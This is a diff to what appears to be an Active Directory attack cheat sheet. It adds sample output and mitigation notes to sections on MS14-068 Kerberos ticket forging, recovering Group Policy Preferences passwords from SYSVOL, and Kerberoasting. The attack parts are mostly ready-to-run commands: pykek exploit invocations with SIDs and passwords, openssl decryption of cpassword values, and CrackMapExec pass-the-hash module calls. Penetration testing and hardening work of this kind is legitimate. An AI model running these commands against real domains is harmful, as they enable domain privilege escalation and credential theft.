@@ -9,7 +9,7 @@
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
-    - [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
+    - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
     - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
       - [Using ndtsutil](#using-ndtsutil)
       - [Using Vshadow](#using-vshadow)
@@ -214,11 +214,22 @@ Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
 ```
 
 ```powershell
-# https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
-git clone https://github.com/SecWiki/windows-kernel-exploits
-python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
-python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
-python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
+# Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+$ git clone https://github.com/SecWiki/windows-kernel-exploits
+$ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
+$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
+$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
+$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
+-1105
+  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
+  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
+  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
+  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
+  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
+  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
+  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
+  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
+  [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!
 ```
 
 Then use `mimikatz` to load the ticket.
@@ -236,6 +247,11 @@ clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
 Linux> sudo date -s "14 APR 2015 18:25:16" 
 Windows> net time /domain /set
 ```
+
+#### Mitigations
+
+* Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
+
 
 ### Open Shares
 
@@ -317,11 +333,11 @@ IconIndex=1
 ```
 
 
-### GPO - Pivoting with Local Admin & Passwords in SYSVOL
+### Passwords in SYSVOL & Group Policy Preferences
 
 :triangular_flag_on_post: GPO Priorization : Organization Unit > Domain > Site > Local
 
-Find password in SYSVOL (MS14-025)
+Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.
 
 ```powershell
 findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
@@ -338,20 +354,22 @@ echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d
 echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
 ```
 
-Metasploit modules to enumerate shares and credentials
+#### Automate the SYSVOL and passwords research
 
-```c
-scanner/smb/smb_enumshares
-post/windows/gather/enum_shares
-post/windows/gather/credentials/gpp
-```
+* Metasploit modules to enumerate shares and credentials
 
-Crackmapexec modules
+    ```c
+    scanner/smb/smb_enumshares
+    post/windows/gather/enum_shares
+    post/windows/gather/credentials/gpp
+    ```
 
-```powershell
-cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
-cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password
-```
+* Crackmapexec modules
+
+    ```powershell
+    cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
+    cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password
+    ```
 
 List all GPO for a domain
 
@@ -363,6 +381,12 @@ Powersploit:
 Get-NetGPO
 Get-NetGPOGroup
 ```
+
+#### Mitigations
+
+* Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
+* Delete existing GPP xml files in SYSVOL containing passwords.
+* Don’t put passwords in files that are accessible by all authenticated users.
 
 ### Dumping AD Domain Credentials
 
@@ -679,7 +703,7 @@ hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ```
 
 Mitigations: 
-* Have a very long password for your accounts with SPNs
+* Have a very long password for your accounts with SPNs (> 25 characters)
 * Make sure no users have SPNs
 
 ### KRB_AS_REP Roasting
